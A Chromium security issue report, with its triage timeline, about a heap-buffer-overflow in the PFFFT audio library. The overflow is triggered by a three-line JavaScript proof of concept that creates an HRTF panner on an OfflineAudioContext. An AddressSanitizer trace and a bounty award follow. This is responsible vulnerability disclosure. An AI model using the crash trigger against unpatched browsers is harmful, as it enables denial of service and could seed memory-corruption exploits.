# Security: heap overflow in radf4_ps

| Field | Value |
|-------|-------|
| **Issue ID** | [40050116](https://issues.chromium.org/issues/40050116) |
| **Status** | Assigned |
| **Severity** | Unknown |
| **Priority** | P2 |
| **Component** | Blink>Media>Audio, Blink>WebAudio |
| **Platforms** | Windows |
| **Reporter** | jo...@microsoft.com |
| **Assignee** | rt...@chromium.org |
| **Created** | 2019-09-13 |
| **Bounty** | $500.00 |

## Description

**-------------------------**

**VULNERABILITY DETAILS**  

Adding a panner to an offline audio context will cause a heap overflow in the "PFFFT" library.

**VERSION**  

Chrome Version: Tested on commit c6e1baabea9fe771f139f00aa422a9c1cf751f7b  

Operating System: Windows 10 x64

**REPRODUCTION CASE**

.\chrome.exe --no-sandbox crash.html

POC

<script>
ctx=new OfflineAudioContext(7,-5,4448);
panner=ctx.createPanner();
panner.panningModel='HRTF';
</script>
# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION** Type of crash: renderer (tab) Crash State:

==7816==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11d72a0b6bd0 at pc 0x7ff8c019be87 bp 0x0071df3fe8c0 sp 0x0071df3fe908  

READ of size 16 at 0x11d72a0b6bd0 thread T14  

==7816==\*\*\* WARNING: Failed to initialize DbgHelp! \*\*\*  

==7816==\*\*\* Most likely this means that the app is already \*\*\*  

==7816==\*\*\* using DbgHelp, possibly with incompatible flags. \*\*\*  

==7816==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  

==7816==\*\*\* or produce wrong results. \*\*\*  

#0 0x7ff8c019be86 in radf4\_ps F:\chromium\src\third\_party\pffft\src\pffft.c:624  

#1 0x7ff8c0195cd2 in rfftf1\_ps F:\chromium\src\third\_party\pffft\src\pffft.c:977  

#2 0x7ff8c0195271 in pffft\_transform\_internal F:\chromium\src\third\_party\pffft\src\pffft.c:1622  

#3 0x7ff8c019b1aa in pffft\_transform\_ordered F:\chromium\src\third\_party\pffft\src\pffft.c:1880  

#4 0x7ff8cb9e0fd4 in blink::FFTFrame::DoFFT F:\chromium\src\third\_party\blink\renderer\platform\audio\pffft\fft\_frame\_pffft.cc:164  

#5 0x7ff8cc79863a in blink::HRTFKernel::HRTFKernel F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_kernel.cc:74  

#6 0x7ff8cc69422e in blink::HRTFElevation::CalculateKernelsForAzimuthElevation F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_elevation.cc:167  

#7 0x7ff8cc6949c2 in blink::HRTFElevation::CreateForSubject F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_elevation.cc:226  

#8 0x7ff8cc6971d1 in blink::HRTFDatabase::HRTFDatabase F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_database.cc:55  

#9 0x7ff8cc356c0c in blink::HRTFDatabaseLoader::LoadTask F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_database\_loader.cc:83  

#10 0x7ff8bf5108ca in base::TaskAnnotator::RunTask F:\chromium\src\base\task\common\task\_annotator.cc:142  

#11 0x7ff8c18bfd8e in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:365  

#12 0x7ff8c18befdc in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:219  

#13 0x7ff8c188531f in base::MessagePumpDefault::Run F:\chromium\src\base\message\_loop\message\_pump\_default.cc:39  

#14 0x7ff8c18c26d5 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:463  

#15 0x7ff8bf4b1537 in base::RunLoop::Run F:\chromium\src\base\run\_loop.cc:156  

#16 0x7ff8bde0c0f1 in blink::scheduler::WorkerThread::SimpleThreadImpl::Run F:\chromium\src\third\_party\blink\renderer\platform\scheduler\worker\worker\_thread.cc:169  

#17 0x7ff8bf55825c in base::`anonymous namespace'::ThreadFunc F:\chromium\src\base\threading\platform\_thread\_win.cc:102  

#18 0x7ff6aa732408 in \_\_asan::AsanThread::ThreadStart C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_thread.cpp:262  

#19 0x7ff952b67bd3 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017bd3)  

#20 0x7ff95470cee0 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18006cee0)

0x11d72a0b6bd4 is located 0 bytes to the right of 132-byte region [0x11d72a0b6b50,0x11d72a0b6bd4)  

allocated by thread T14 here:  

#0 0x7ff6aa7285ab in calloc C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_malloc\_win.cpp:117  

#1 0x7ff8c054a238 in WTF::Partitions::FastZeroedMalloc F:\chromium\src\third\_party\blink\renderer\platform\wtf\allocator\partitions.cc:236  

#2 0x7ff8bde63a14 in blink::AudioArray<float>::Allocate F:\chromium\src\third\_party\blink\renderer\platform\audio\audio\_array.h:83  

#3 0x7ff8c42f8927 in blink::AudioChannel::AudioChannel F:\chromium\src\third\_party\blink\renderer\platform\audio\audio\_channel.h:58  

#4 0x7ff8c42f0c98 in blink::AudioBus::AudioBus F:\chromium\src\third\_party\blink\renderer\platform\audio\audio\_bus.cc:68  

#5 0x7ff8c42f0a24 in blink::AudioBus::Create F:\chromium\src\third\_party\blink\renderer\platform\audio\audio\_bus.cc:59  

#6 0x7ff8c42f65f6 in blink::AudioBus::CreateBySampleRateConverting F:\chromium\src\third\_party\blink\renderer\platform\audio\audio\_bus.cc:622  

#7 0x7ff8cc69412e in blink::HRTFElevation::CalculateKernelsForAzimuthElevation F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_elevation.cc:155  

#8 0x7ff8cc6949c2 in blink::HRTFElevation::CreateForSubject F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_elevation.cc:226  

#9 0x7ff8cc6971d1 in blink::HRTFDatabase::HRTFDatabase F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_database.cc:55  

#10 0x7ff8cc356c0c in blink::HRTFDatabaseLoader::LoadTask F:\chromium\src\third\_party\blink\renderer\platform\audio\hrtf\_database\_loader.cc:83  

#11 0x7ff8bf5108ca in base::TaskAnnotator::RunTask F:\chromium\src\base\task\common\task\_annotator.cc:142  

#12 0x7ff8c18bfd8e in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:365  

#13 0x7ff8c18befdc in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:219  

#14 0x7ff8c188531f in base::MessagePumpDefault::Run F:\chromium\src\base\message\_loop\message\_pump\_default.cc:39  

#15 0x7ff8c18c26d5 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:463  

#16 0x7ff8bf4b1537 in base::RunLoop::Run F:\chromium\src\base\run\_loop.cc:156  

#17 0x7ff8bde0c0f1 in blink::scheduler::WorkerThread::SimpleThreadImpl::Run F:\chromium\src\third\_party\blink\renderer\platform\scheduler\worker\worker\_thread.cc:169  

#18 0x7ff8bf55825c in base::`anonymous namespace'::ThreadFunc F:\chromium\src\base\threading\platform\_thread\_win.cc:102  

#19 0x7ff6aa732408 in \_\_asan::AsanThread::ThreadStart C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_thread.cpp:262  

#20 0x7ff952b67bd3 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017bd3)  

#21 0x7ff95470cee0 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18006cee0)

Thread T14 created by T0 here:  

#0 0x7ff6aa732f6c in \_\_asan\_wrap\_CreateThread C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_win.cpp:146  

#1 0x7ff8bf556f7d in base::`anonymous namespace'::CreateThreadInternal F:\chromium\src\base\threading\platform_thread_win.cc:149 #2 0x7ff8bf55fb88 in base::SimpleThread::StartAsync F:\chromium\src\base\threading\simple_thread.cc:51 #3 0x7ff8bde0a3db in blink::scheduler::WorkerThread::Init F:\chromium\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread.cc:61 #4 0x7ff8bdd68fea in blink::Thread::CreateThread F:\chromium\src\third_party\blink\renderer\platform\scheduler\common\thread.cc:82 #5 0x7ff8c0b1fe08 in blink::Platform::CreateThread F:\chromium\src\third_party\blink\renderer\platform\exported\platform.cc:306 #6 0x7ff8cc35621a in blink::HRTFDatabaseLoader::LoadAsynchronously F:\chromium\src\third_party\blink\renderer\platform\audio\hrtf_database_loader.cc:97 #7 0x7ff8cc355978 in blink::HRTFDatabaseLoader::CreateAndLoadAsynchronouslyIfNecessary F:\chromium\src\third_party\blink\renderer\platform\audio\hrtf_database_loader.cc:60 #8 0x7ff8cb9ec75b in blink::AudioListener::CreateAndLoadHRTFDatabaseLoader F:\chromium\src\third_party\blink\renderer\modules\webaudio\audio_listener.cc:283 #9 0x7ff8cae4ef32 in blink::PannerHandler::SetPanningModel F:\chromium\src\third_party\blink\renderer\modules\webaudio\panner_node.cc:327 #10 0x7ff8cae491dd in blink::PannerHandler::SetPanningModel F:\chromium\src\third_party\blink\renderer\modules\webaudio\panner_node.cc #11 0x7ff8ca2fc46b in blink::V8PannerNode::PanningModelAttributeSetterCallback F:\chromium\src\out\Asan\gen\third_party\blink\renderer\bindings\modules\v8\v8_panner_node.cc:583 #12 0x7ff8b8b996bc in v8::internal::FunctionCallbackArguments::Call F:\chromium\src\v8\src\api\api-arguments-inl.h:158 #13 0x7ff8b8b95b76 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> F:\chromium\src\v8\src\builtins\builtins-api.cc:111  

#14 0x7ff8b8b93b39 in v8::internal::Builtins::InvokeApiFunction F:\chromium\src\v8\src\builtins\builtins-api.cc:227  

#15 0x7ff8b9a5c78e in v8::internal::Object::SetPropertyWithAccessor F:\chromium\src\v8\src\objects\objects.cc:1559  

#16 0x7ff8b9a71693 in v8::internal::Object::SetPropertyInternal F:\chromium\src\v8\src\objects\objects.cc:2467  

#17 0x7ff8b9a70261 in v8::internal::Object::SetProperty F:\chromium\src\v8\src\objects\objects.cc:2522  

#18 0x7ff8b9fe9da0 in v8::internal::Runtime::SetObjectProperty F:\chromium\src\v8\src\runtime\runtime-object.cc:425  

#19 0x7ff8b9ffe7f4 in v8::internal::Runtime\_SetNamedProperty F:\chromium\src\v8\src\runtime\runtime-object.cc:684  

#20 0x7ff8bb606e5c in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_NoBuiltinExit+0x3c (F:\chromium\src\out\Asan\chrome\_child.dll+0x182c76e5c)  

#21 0x7ff8bb666159 in Builtins\_StaNamedPropertyNoFeedbackHandler+0x59 (F:\chromium\src\out\Asan\chrome\_child.dll+0x182cd6159)  

#22 0x7ff8bb58c4a8 in Builtins\_InterpreterEntryTrampoline+0x2a8 (F:\chromium\src\out\Asan\chrome\_child.dll+0x182bfc4a8)  

#23 0x7ff8bb5899bd in Builtins\_JSEntryTrampoline+0x5d (F:\chromium\src\out\Asan\chrome\_child.dll+0x182bf99bd)  

#24 0x7ff8bb5895ab in Builtins\_JSEntry+0xcb (F:\chromium\src\out\Asan\chrome\_child.dll+0x182bf95ab)  

#25 0x7ff8b8f63650 in v8::internal::`anonymous namespace'::Invoke F:\chromium\src\v8\src\execution\execution.cc:266  

#26 0x7ff8b8f623e5 in v8::internal::Execution::Call F:\chromium\src\v8\src\execution\execution.cc:358  

#27 0x7ff8b89c7aed in v8::Script::Run F:\chromium\src\v8\src\api\api.cc:2161  

#28 0x7ff8c094f3ce in blink::V8ScriptRunner::RunCompiledScript F:\chromium\src\third\_party\blink\renderer\bindings\core\v8\v8\_script\_runner.cc:340  

#29 0x7ff8c38068f4 in blink::ScriptController::ExecuteScriptAndReturnValue F:\chromium\src\third\_party\blink\renderer\bindings\core\v8\script\_controller.cc:133  

#30 0x7ff8c3809abb in blink::ScriptController::EvaluateScriptInMainWorld F:\chromium\src\third\_party\blink\renderer\bindings\core\v8\script\_controller.cc:353  

#31 0x7ff8c380a433 in blink::ScriptController::ExecuteScriptInMainWorld F:\chromium\src\third\_party\blink\renderer\bindings\core\v8\script\_controller.cc:318  

#32 0x7ff8c648ae0f in blink::ClassicScript::RunScript F:\chromium\src\third\_party\blink\renderer\core\script\classic\_script.cc:23  

#33 0x7ff8c8b7e54b in blink::PendingScript::ExecuteScriptBlockInternal F:\chromium\src\third\_party\blink\renderer\core\script\pending\_script.cc:260  

#34 0x7ff8c8b7dd5a in blink::PendingScript::ExecuteScriptBlock F:\chromium\src\third\_party\blink\renderer\core\script\pending\_script.cc:168  

#35 0x7ff8c6c4ae5d in blink::ScriptLoader::PrepareScript F:\chromium\src\third\_party\blink\renderer\core\script\script\_loader.cc:890  

#36 0x7ff8c6ee42c0 in blink::HTMLParserScriptRunner::ProcessScriptElementInternal F:\chromium\src\third\_party\blink\renderer\core\script\html\_parser\_script\_runner.cc:597  

#37 0x7ff8c6ee3da0 in blink::HTMLParserScriptRunner::ProcessScriptElement F:\chromium\src\third\_party\blink\renderer\core\script\html\_parser\_script\_runner.cc:333  

#38 0x7ff8c37b67c9 in blink::HTMLDocumentParser::RunScriptsForPausedTreeBuilder F:\chromium\src\third\_party\blink\renderer\core\html\parser\html\_document\_parser.cc:298  

#39 0x7ff8c37baba4 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser F:\chromium\src\third\_party\blink\renderer\core\html\parser\html\_document\_parser.cc:538  

#40 0x7ff8c37b601e in blink::HTMLDocumentParser::PumpPendingSpeculations F:\chromium\src\third\_party\blink\renderer\core\html\parser\html\_document\_parser.cc:596  

#41 0x7ff8bdd63096 in blink::TaskHandle::Runner::Run F:\chromium\src\third\_party\blink\renderer\platform\scheduler\common\post\_cancellable\_task.cc:47  

#42 0x7ff8bf5108ca in base::TaskAnnotator::RunTask F:\chromium\src\base\task\common\task\_annotator.cc:142  

#43 0x7ff8c18bfd8e in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:365  

#44 0x7ff8c18befdc in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:219  

#45 0x7ff8c188531f in base::MessagePumpDefault::Run F:\chromium\src\base\message\_loop\message\_pump\_default.cc:39  

#46 0x7ff8c18c26d5 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:463  

#47 0x7ff8bf4b1537 in base::RunLoop::Run F:\chromium\src\base\run\_loop.cc:156  

#48 0x7ff8c16cd0df in content::RendererMain F:\chromium\src\content\renderer\renderer\_main.cc:213  

#49 0x7ff8bf254ccb in content::ContentMainRunnerImpl::Run F:\chromium\src\content\app\content\_main\_runner\_impl.cc:874  

#50 0x7ff8bf3c0464 in service\_manager::Main F:\chromium\src\services\service\_manager\embedder\main.cc:423  

#51 0x7ff8bf2527ad in content::ContentMain F:\chromium\src\content\app\content\_main.cc:19  

#52 0x7ff8b89913ac in ChromeMain F:\chromium\src\chrome\app\chrome\_main.cc:110  

#53 0x7ff6aa677ded in MainDllLoader::Launch F:\chromium\src\chrome\app\main\_dll\_loader\_win.cc:202  

#54 0x7ff6aa672ccd in main F:\chromium\src\chrome\app\chrome\_exe\_main\_win.cc:234  

#55 0x7ff6aaaa66cb in \_\_scrt\_common\_main\_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe\_common.inl:288  

#56 0x7ff952b67bd3 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017bd3)  

#57 0x7ff95470cee0 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18006cee0)

SUMMARY: AddressSanitizer: heap-buffer-overflow F:\chromium\src\third\_party\pffft\src\pffft.c:624 in radf4\_ps  

Shadow bytes around the buggy address:  

0x03f80f496d20: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa  

0x03f80f496d30: fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd  

0x03f80f496d40: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa  

0x03f80f496d50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x03f80f496d60: 04 fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00  

=>0x03f80f496d70: 00 00 00 00 00 00 00 00 00 00[04]fa fa fa fa fa  

0x03f80f496d80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x03f80f496d90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x03f80f496da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x03f80f496db0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x03f80f496dc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==7816==ABORTING

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Johnathan Norman Microsoft Browser Vulnerability Research

## Attachments

- [chrome.asan](attachments/chrome.asan) (application/octet-stream, 15.6 KB)
- [crash.html](attachments/crash.html) (text/plain, 124 B)

## Timeline

### dr...@chromium.org (2019-09-16)

I'm getting a CHECK failure instead of a use-after-free when running your PoC, but that's still not ideal. Sending along to the Blink>Media>Audio team.

olka@, tommi@, can you take a look?

### ol...@chromium.org (2019-09-16)

Alessio, that's pffft - PTAL.

### ol...@chromium.org (2019-09-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-28)

alessiob: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-10-13)

alessiob: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### al...@chromium.org (2019-10-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-04-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5665940600061952.

### al...@chromium.org (2020-04-16)

This issue looks similar to https://bugs.chromium.org/p/chromium/issues/detail?id=1032000.
Reassigning.

### ad...@google.com (2020-04-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-04-16)

Testcase 5665940600061952 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5665940600061952.

### rt...@chromium.org (2020-04-16)

[Empty comment from Monorail migration]

[Monorail components: Blink>WebAudio]

### rt...@chromium.org (2020-04-16)

Yes, the repro case looks pretty much like in https://crbug.com/chromium/1032000, as mentioned in c#10.  The backtrace is pretty much identical too.

I let the repro case run for about 30 min on my linux box.  No crashes.

I've asked clusterfuzz to check to see if the issue is fixed;  waiting to  hear back.


### rt...@chromium.org (2020-04-17)

Clusterfuzz says the test is flaky.  Perhaps that's related to the selected OfflineAudioContext length of -5, which gets wrapped around to 4294967291 and there might not always be enough memory for a buffer of that size.

See also https://crbug.com/chromium/1041411 which has the same backtrace as here and 1032000 and is more reliable reproduction.

The difference between this test case and https://crbug.com/chromium/1041411 is a length of -5 vs 4*1280 and a sample rate of 4448 vs 4000

I believe this is fixed.

Closing as fixed.

### cl...@chromium.org (2020-04-17)

Testcase 5665940600061952 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5665940600061952.

### [Deleted User] (2020-04-18)

[Empty comment from Monorail migration]

### ad...@google.com (2020-05-13)

[Empty comment from Monorail migration]

### ad...@google.com (2020-05-13)

I'm going to be assuming that, like https://crbug.com/chromium/1041411, this didn't affect a shipping build. Please correct if I'm wrong.

### ad...@google.com (2020-05-15)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-16)

[Empty comment from Monorail migration]

### na...@google.com (2020-05-21)

Congrats! The Panel decided to award $500 for this report

### na...@google.com (2020-05-29)

[Empty comment from Monorail migration]

### na...@google.com (2020-05-29)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1003908?no_tracker_redirect=1

[Multiple monorail components: Blink>Media>Audio, Blink>WebAudio]
[Monorail mergedinto: crbug.com/chromium/1041411]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050116)*
